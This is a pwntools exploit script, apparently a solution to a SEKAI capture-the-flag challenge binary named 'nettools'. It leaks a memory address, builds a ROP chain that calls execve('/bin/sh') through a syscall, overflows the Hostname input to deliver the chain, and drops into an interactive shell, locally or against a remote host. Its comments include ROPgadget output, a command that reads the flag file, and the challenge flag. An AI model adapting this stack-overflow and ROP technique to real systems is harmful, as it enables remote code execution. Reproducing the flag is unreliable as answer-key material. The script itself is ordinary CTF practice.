from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./nettools")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

r.recvuntil(b'is leaked: ')
leak = int(r.recvline().strip().decode(),16)
print("leak",hex(leak))
r.sendlineafter(b'> ',b'3')
base = leak - 499772

from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = base
rebase_0 = lambda x : p(x + IMAGE_BASE_0)
# no pop rdx gadget in this large binary, what a shame
rop = b''
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a008)
rop += rebase_0(0x000000000002b9cb) # 0x000000000002b9cb: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x000000000000a0ef) # 0x000000000000a0ef: pop rdi; ret;
rop += rebase_0(0x000000000007a000)
rop += rebase_0(0x0000000000009c18) # 0x0000000000009c18: pop rsi; ret;
rop += rebase_0(0x000000000007a008)
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += rebase_0(0x7a190) # Some where we can write so [rax] won't crash
# 0x0000000000020bb3 : pop rdx ; add byte ptr [rax], al ; ret
rop += rebase_0(0x0000000000020bb3)
rop += rebase_0(0x000000000007a008)
rop += rebase_0(0x000000000000ecaa) # 0x000000000000ecaa: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000025adf) # 0x0000000000025adf: syscall;
r.sendlineafter(b'Hostname: ',b'A' * 399 + b'\x00' + cyclic(344) + rop)
r.interactive()


'''
ROPGadget --binary nettools | grep "pop rdx ;" | grep ret
0x00000000000570df : add byte ptr [rax + 3], cl ; pop rdx ; or byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00000000000570dd : add byte ptr [rax], al ; add byte ptr [rax + 3], cl ; pop rdx ; or byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000005cbff : outsd dx, dword ptr [rsi] ; pop rdx ; adc byte ptr [rax - 0x7d], cl ; ret 0x6620
0x000000000005cc00 : pop rdx ; adc byte ptr [rax - 0x7d], cl ; ret 0x6620
0x0000000000020bb3 : pop rdx ; add byte ptr [rax], al ; ret
0x00000000000570e2 : pop rdx ; or byte ptr [rax - 0x7d], cl ; ret 0x4810
0x0000000000043c91 : pop rdx ; sub byte ptr [rax - 0x75], cl ; xor byte ptr [rax - 0x7d], cl ; ret 0x4838
'''
'''
cat /home/`whoami`/f*
SEKAI{g0_g0_g0_th4t's_h0w_th3_c4rg0_bl0w_4c6cfa1707c99bd5105dd8f16590bece}
'''